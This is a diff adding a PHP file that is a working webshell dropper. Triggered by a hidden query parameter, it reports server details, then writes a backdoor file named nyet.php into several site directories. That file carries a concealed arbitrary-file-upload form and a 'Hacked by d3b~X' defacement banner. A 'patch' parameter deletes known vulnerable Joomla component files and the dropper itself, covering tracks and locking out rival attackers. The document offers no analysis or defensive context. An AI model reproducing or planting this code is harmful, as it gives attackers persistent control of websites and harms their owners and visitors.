@@ -1,0 +1,22 @@
+<?php error_reporting(0);if(isset($_GET["yzhdn"])){echo"[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";}}$file = '<?php if(isset($_GET["yzhdn"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?><?php echo "<!-- vsrJ1-E= -->";echo "<br>";?><title>Hacked by d3b~X</title><center><div id=q>Gantengers Crew<br><font size=2>SultanHaikal - d3b~X - Brian Kamikaze - Coupdegrace - Mdn_newbie - Index Php <style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}<!-- <?php echo md5(deb) ?> -->';
+$r=fopen("nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../../nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../../../nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../../tmp/nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../../images/nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../tmp/nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../images/nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("../components/nyet.php", "w");fwrite($r,$file);fclose($r);
+$r=fopen("components/nyet.php", "w");fwrite($r,$file);fclose($r);
+if(isset($_GET["patch"])){
+ if(file_exists("components/com_jce/jce.php")) unlink("components/com_jce/jce.php");
+ if(file_exists("../components/com_jce/jce.php")) unlink("../components/com_jce/jce.php");
+ if(file_exists("components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php")) unlink("components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php");
+ if(file_exists("components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php")) unlink("components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php");
+ if(file_exists("../components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php")) unlink("../components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php");
+ if(file_exists("../components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php")) unlink("../components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php");
+ unlink(__FILE__);
+ echo "Patched";
+}
+echo md5(deb); ?>
